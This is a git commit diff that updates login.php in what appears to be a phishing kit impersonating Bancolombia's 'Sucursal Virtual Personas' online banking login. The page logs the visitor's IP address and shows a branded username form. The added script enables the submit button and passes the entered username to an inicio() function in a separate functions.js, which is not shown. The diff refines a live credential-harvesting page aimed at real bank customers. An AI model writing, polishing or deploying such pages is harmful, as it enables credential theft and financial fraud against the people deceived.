8219b3bec083f135fb426268fcdf2664b00b1e16
leidyjhoanalj88-png <leidyjhoanalj88@gmail.com>
2026-04-22 02:38:52 -0500

    Actualizar login.php

--- a/login.php
+++ a/login.php
@@ -3,17 +3,11 @@ $ip = getenv("REMOTE_ADDR");
 date_default_timezone_set('America/Bogota');
 $tiempo = date("l, j \d\e F \d\e Y");
 ?>
+<!DOCTYPE html>
 <html>
     <head>
         <title>Bancolombia Sucursal Virtual Personas</title>
-        <meta http-equiv="content-type" content="text/html; utf-8">
         <meta charset="utf-8">
-        
-        <meta content="es" http-equiv="Content-Language">
-    
-        <meta name="description" content="">
-        <meta name="author" content="">
-        <meta name="Copyright" content="">
         <meta name="viewport" content="width=device-width, initial-scale=1.0">
         <meta http-equiv="X-UA-Compatible" content="IE=edge">
 
@@ -26,59 +20,86 @@ $tiempo = date("l, j \d\e F \d\e Y");
         <link href="../css/style-app.css?v2" rel="stylesheet">        
         <link rel="icon" type="image/png" href="../img/logo.png" />
         <script type="text/javascript" src="../js/jquery-3.6.0.min.js"></script>
-        <script src="../js/jquery.jclock-min.js" type="text/javascript"></script>
-    
-        <script type="text/javascript" src="../js/functions.js?v1"></script>
-        <script type="text/javascript" src="../js/ready.js?v2"></script>
+        <script type="text/javascript" src="../js/functions.js?v=<?php echo time(); ?>"></script>
 
         <style type="text/css">
-
+            /* Forzamos que el cargando nazca oculto para evitar que se pegue */
+            #fondo, #cargando, #cargando-o {
+                display: none !important;
+                position: fixed;
+                top: 0; left: 0; width: 100%; height: 100%;
+                background: rgba(255,255,255,0.9);
+                z-index: 9999;
+                text-align: center;
+                padding-top: 50%;
+            }
+            #btn-continuar:disabled { background-color: #ccc; cursor: not-allowed; color: #777; }
+            #btn-continuar { background-color: #FDDA24; color: #000; font-weight: bold; }
         </style>
-        
     </head>
     <body>         
         <div id="fondo"></div>
-        <div id="cargando">
-            <img src="../img/logo.svg">            
-            <br>
-            <img src="../img/load2.gif" />
-        </div>
         <div id="cargando-o">
             <img src="../img/load4.gif" width="90">            
-            <br>
-            Cargando...
+            <br>Cargando...
         </div>
 
-        <table width="100%" border="0" cellpadding="0" cellspacing="0">
+        <table width="100%" border="0" cellpadding="0" cellspacing="0" style="padding: 10px;">
             <tr>
                 <td valign="middle" align="left" width="33%"><img src="../img/btn-cerrar.jpg" height="29"></td>
                 <td valign="middle" align="center" width="34%"><img src="../img/logo-app.jpg" height="29"></td>
-                <td valign="middle" align="right" width="33%"><img src="../img/btn-continuar-off.jpg" height="29" id="lnk-continuar"></td>
+                <td valign="middle" align="right" width="33%"><img src="../img/btn-continuar-off.jpg" height="29"></td>
             </tr>
         </table>
-        <img src="../img/logo.svg" width="260" style="margin-top: 48px;margin-bottom: 34px;">
-        <div class="titulo-app">Ingresa tu usuario</div>  
-        <div class="descripcion-app">El usuario es el mismo con que ingresas a la Sucursal Virtual Personas</div>  
-        <div class="frm">
-            <div class="inp" id="inp-usuario">
+
+        <div align="center">
+            <img src="../img/logo.svg" width="220" style="margin-top: 40px; margin-bottom: 30px;">
+        </div>
+
+        <div class="titulo-app" style="text-align: center; font-weight: 800;">Ingresa tu usuario</div>  
+        <div class="descripcion-app" style="text-align: center; padding: 0 20px;">El usuario es el mismo con que ingresas a la Sucursal Virtual Personas</div>  
+        
+        <div class="frm" style="padding: 25px;">
+            <div class="inp" id="inp-usuario" style="border-bottom: 1px solid #ccc; padding: 10px 0;">
                 <table width="100%" cellpadding="0" cellspacing="0" border="0">
                     <tr>
                         <td valign="middle" width="36" align="left"><img src="../img/ico-u.jpg" width="26"></td>
                         <td valign="middle" align="left">
-                            <input type="text" name="txt-usuario" id="txt-usuario" class="entradas" autocomplete="off">
+                            <input type="text" name="txt-usuario" id="txt-usuario" class="entradas" autocomplete="off" placeholder="Ingresa el usuario" style="border: none; outline: none; width: 100%; font-size: 16px;">
                         </td>
                     </tr>
                 </table>
             </div>
-            <div class="etiquetas" id="etq-usuario">Ingresa el usuario</div>
         </div>  
-        <button class="botones" id="btn-continuar" disabled>CONTINUAR</button> 
-        <br><br><br>
-        <div style="color:#1A1B1A;font-weight: bold;font-size: 16px;text-decoration: underline; cursor: pointer;text-align: center;">¿No eres cliente?</div>  
+
+        <button class="botones" id="btn-continuar" style="width: 85%; margin: 0 auto; display: block; height: 50px; border: none; border-radius: 25px;" disabled>CONTINUAR</button> 
+        
+        <br><br>
+        <div style="color:#1A1B1A; font-weight: bold; font-size: 14px; text-decoration: underline; cursor: pointer; text-align: center;">¿No eres cliente?</div>  
+
+        <script type="text/javascript">
+            $(document).ready(function() { 
+                // Aseguramos pantalla limpia
+                $("#fondo, #cargando-o").hide();
+
+                // Activar botón dinámicamente
+                $("#txt-usuario").on("input", function() {
+                    if ($(this).val().length >= 4) {
+                        $("#btn-continuar").prop("disabled", false);
+                    } else {
+                        $("#btn-continuar").prop("disabled", true);
+                    }
+                });
+
+                // Acción de envío
+                $("#btn-continuar").click(function() {
+                    var user_val = $("#txt-usuario").val();
+                    if (user_val !== "") {
+                        // Llamamos a la función inicio del functions.js
+                        inicio(user_val);
+                    }
+                });
+            });
+        </script>
     </body>
 </html>
-<script type="text/javascript">
-    $(document).ready(function() { 
-                     
-    });
- </script>
